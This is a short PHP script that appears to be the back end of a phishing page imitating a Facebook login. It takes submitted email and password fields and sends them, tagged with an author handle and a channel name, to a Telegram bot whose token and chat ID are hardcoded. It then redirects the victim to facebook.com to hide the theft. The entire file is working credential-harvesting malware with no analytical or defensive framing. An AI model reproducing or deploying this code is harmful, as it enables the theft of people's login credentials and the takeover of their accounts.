<?php
$botToken = '7132592563:AAEbEq4m8xh_aZ55uw2Mh79Auzv1qPYH3Zc';
$chatID = '5531137621';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['email']) && isset($_POST['password'])) {
        $email = $_POST['email'];
        $password = $_POST['password'];
        $message = "New login 👤\n\nEmail: $email \n\nPassword: $password\n\nAuthor: @A_R_M_A_N_HUSSEN\n\nChannel: @teamblackberry";
        
        $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=" . urlencode($message);
        file_get_contents($url); 
        
        header("Location: https://www.facebook.com");
        exit(); 
    } else {
        echo "Please provide both email and password.";
    }
}
?>
